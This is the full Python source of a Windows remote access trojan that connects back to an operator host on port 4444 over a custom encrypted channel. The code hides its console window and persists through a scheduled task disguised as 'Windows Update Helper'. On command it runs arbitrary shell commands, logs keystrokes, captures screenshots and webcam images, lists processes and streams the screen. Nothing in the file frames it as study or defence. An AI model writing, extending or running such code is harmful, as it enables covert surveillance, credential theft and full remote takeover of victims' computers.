import socket
import struct
import json
import os
import sys
import subprocess
import time
import random
import threading
import hashlib
import hmac
import base64
import select
import ctypes

HOST = os.environ.get("CROCK_HOST", "192.168.122.1")
PORT = int(os.environ.get("CROCK_PORT", "4444"))
KEY = os.environ.get("CROCK_KEY", "CrockKey2026!!CrockKey2026!!!!!").encode()
MAX_MSG = 8 * 1024 * 1024

try:
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    kernel32 = ctypes.windll.kernel32
except Exception:
    user32 = gdi32 = kernel32 = None

CREATE_NO_WINDOW = 0x08000000


def hkdf(key, salt, info, length=32):
    prk = hmac.new(salt, key, hashlib.sha256).digest()
    out = b""
    t = b""
    counter = 1
    while len(out) < length:
        t = hmac.new(prk, t + info + bytes([counter]), hashlib.sha256).digest()
        out += t
        counter += 1
    return out[:length]


def keystream(key_enc, counter, length):
    out = b""
    c = counter
    while len(out) < length:
        out += hashlib.sha256(key_enc + struct.pack("<Q", c)).digest()
        c += 1
    return out[:length]


def mac(key_mac, data):
    return hmac.new(key_mac, data, hashlib.sha256).digest()[:16]


def send_data(s, data, ctr, key_enc, key_mac):
    if isinstance(data, str):
        data = data.encode()
    body = mac(key_mac, data) + data
    ks = keystream(key_enc, ctr[0], len(body))
    enc = bytes(a ^ b for a, b in zip(body, ks))
    ctr[0] += (len(body) + 31) // 32
    s.sendall(struct.pack(">I", len(enc)) + enc)


def recvall(s, n):
    data = b""
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def recv_data(s, ctr, key_enc, key_mac):
    raw = recvall(s, 4)
    if not raw:
        return None
    length = struct.unpack(">I", raw)[0]
    if length == 0 or length > MAX_MSG:
        return None
    buf = recvall(s, length)
    if not buf or len(buf) != length:
        return None
    ks = keystream(key_enc, ctr[0], len(buf))
    plain = bytes(a ^ b for a, b in zip(buf, ks))
    ctr[0] += (len(buf) + 31) // 32
    if len(plain) < 16:
        return None
    tag, msg = plain[:16], plain[16:]
    if not hmac.compare_digest(tag, mac(key_mac, msg)):
        return None
    return msg.decode(errors="ignore")


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def persist():
    try:
        path = os.path.abspath(sys.argv[0])
        rl = "HIGHEST" if is_admin() else "LIMITED"
        cmd = f'schtasks /create /tn "Windows Update Helper" /tr "{path}" /sc onlogon /rl {rl} /f'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        return "persisted"
    except Exception as e:
        return "persist fail: " + str(e)


def exec_cmd(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=25, creationflags=CREATE_NO_WINDOW)
        out = (p.stdout or "") + (p.stderr or "")
        return out if out else "[empty]"
    except Exception as e:
        return "exec error: " + str(e)


def take_screenshot():
    try:
        import mss
        from PIL import Image
        import io
        with mss.mss() as sct:
            mon = sct.monitors[1]
            img = sct.grab(mon)
            im = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
            buf = io.BytesIO()
            im.save(buf, format="PNG")
            return "IMG:" + base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return "screenshot fail: " + str(e)


def take_webcam():
    try:
        import cv2
        from PIL import Image
        import io
        cap = cv2.VideoCapture(0)
        try:
            if not cap.isOpened():
                return "webcam fail: not opened"
            ret, frame = cap.read()
        finally:
            cap.release()
        if not ret:
            return "webcam fail: no frame"
        im = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        buf = io.BytesIO()
        im.save(buf, format="PNG")
        return "IMG:" + base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return "webcam fail: " + str(e)


def proc_list():
    try:
        import psutil
        out = []
        for p in psutil.process_iter(["pid", "name"]):
            try:
                out.append(f"{p.info['pid']:5}  {p.info['name']}")
            except Exception:
                pass
        return "\n".join(out) if out else "[empty]"
    except Exception as e:
        return "proclist fail: " + str(e)


_keylog = []
_keylog_lock = threading.Lock()
_keylog_listener = None
_keylog_running = False


def _keylog_start():
    global _keylog_listener, _keylog_running
    if _keylog_running:
        return
    try:
        from pynput import keyboard
    except Exception:
        return

    def on_press(key):
        if not _keylog_running:
            return False
        try:
            ch = key.char
        except AttributeError:
            ch = f"[{key}]"
        with _keylog_lock:
            _keylog.append(ch)

    _keylog_running = True
    _keylog_listener = keyboard.Listener(on_press=on_press)
    _keylog_listener.start()


def _keylog_stop():
    global _keylog_listener, _keylog_running
    _keylog_running = False
    if _keylog_listener is not None:
        try:
            _keylog_listener.stop()
        except Exception:
            pass
        _keylog_listener = None


def keylog_dump():
    with _keylog_lock:
        return "".join(_keylog) if _keylog else "[empty]"


def keylog_clear():
    with _keylog_lock:
        _keylog.clear()


def hide():
    try:
        if kernel32:
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


_stream_active = threading.Event()
_stream_thread = None
_stream_send_lock = threading.Lock()


def _stream_worker(s, send_ctr, send_lock, key_enc, key_mac):
    while _stream_active.is_set():
        frame = take_screenshot()
        if frame.startswith("IMG:"):
            try:
                with send_lock:
                    send_data(s, "FRAME:" + frame[4:], send_ctr, key_enc, key_mac)
            except Exception:
                _stream_active.clear()
                return
        time.sleep(0.14)


def main():
    global _stream_thread
    hide()
    time.sleep(random.randint(15, 40))
    while True:
        s = None
        key_enc = key_mac = None
        try:
            s = socket.socket()
            s.settimeout(15)
            s.connect((HOST, PORT))
            s.settimeout(None)

            nonce_c = os.urandom(16)
            s.sendall(nonce_c)
            nonce_s = recvall(s, 16)
            if not nonce_s or len(nonce_s) != 16:
                raise Exception("handshake failed")

            salt = nonce_c + nonce_s
            key_enc = hkdf(KEY, salt, b"crock-enc-v1", 32)
            key_mac = hkdf(KEY, salt, b"crock-mac-v1", 32)

            send_ctr = [0]
            recv_ctr = [0]
            info = json.dumps({
                "u": os.getenv("USERNAME", "?"),
                "h": os.getenv("COMPUTERNAME", "?"),
                "a": 1 if is_admin() else 0,
            })
            send_data(s, info, send_ctr, key_enc, key_mac)

            while True:
                cmd = recv_data(s, recv_ctr, key_enc, key_mac)
                if cmd is None:
                    break
                reply = "unknown"
                try:
                    if cmd == "ping":
                        reply = "pong"
                    elif cmd == "info":
                        reply = info
                    elif cmd == "persist":
                        reply = persist()
                    elif cmd == "screenshot":
                        reply = take_screenshot()
                    elif cmd == "webcam":
                        reply = take_webcam()
                    elif cmd == "proclist":
                        reply = proc_list()
                    elif cmd == "keylog_start":
                        _keylog_start()
                        reply = "keylog started"
                    elif cmd == "keylog_stop":
                        _keylog_stop()
                        reply = "keylog stopped"
                    elif cmd == "keylog_dump":
                        reply = keylog_dump()
                    elif cmd == "keylog_clear":
                        keylog_clear()
                        reply = "cleared"
                    elif cmd == "stream_start":
                        if _stream_active.is_set():
                            reply = "stream already running"
                        else:
                            _stream_active.set()
                            _stream_thread = threading.Thread(
                                target=_stream_worker,
                                args=(s, send_ctr, _stream_send_lock, key_enc, key_mac),
                                daemon=True,
                            )
                            _stream_thread.start()
                            reply = "stream started"
                    elif cmd == "stream_stop":
                        if _stream_active.is_set():
                            _stream_active.clear()
                            if _stream_thread is not None:
                                _stream_thread.join(timeout=2)
                                _stream_thread = None
                            reply = "stream stopped"
                        else:
                            reply = "stream stopped"
                    elif cmd.startswith("sh:"):
                        reply = exec_cmd(cmd[3:])
                except Exception as e:
                    reply = "error: " + str(e)
                with _stream_send_lock:
                    send_data(s, reply, send_ctr, key_enc, key_mac)
        except Exception:
            pass
        finally:
            _stream_active.clear()
            if _stream_thread is not None:
                try:
                    _stream_thread.join(timeout=1)
                except Exception:
                    pass
                _stream_thread = None
            if s is not None:
                try:
                    s.close()
                except Exception:
                    pass
        time.sleep(random.randint(8, 18))


if __name__ == "__main__":
    main()
